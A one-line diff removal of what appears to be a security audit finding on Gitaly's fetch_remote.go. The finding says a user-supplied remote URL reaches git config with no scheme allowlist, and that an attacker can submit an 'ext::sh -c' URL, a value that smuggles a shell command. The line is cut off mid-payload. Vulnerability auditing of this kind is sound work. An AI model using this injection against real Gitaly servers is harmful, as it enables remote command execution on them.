@@ -1,1 +1,0 @@
-[File: internal/gitaly/service/repository/fetch_remote.go -> Scope: same] Target: buildCommandOpts setting gitcmd.ConfigPair{Key:'remote.inmemory.url', Value: remoteURL} directly from req.GetRemoteParams().GetUrl() with no scheme allowlist. Attacker action: submit remote_params.url = 'ext::sh -c \
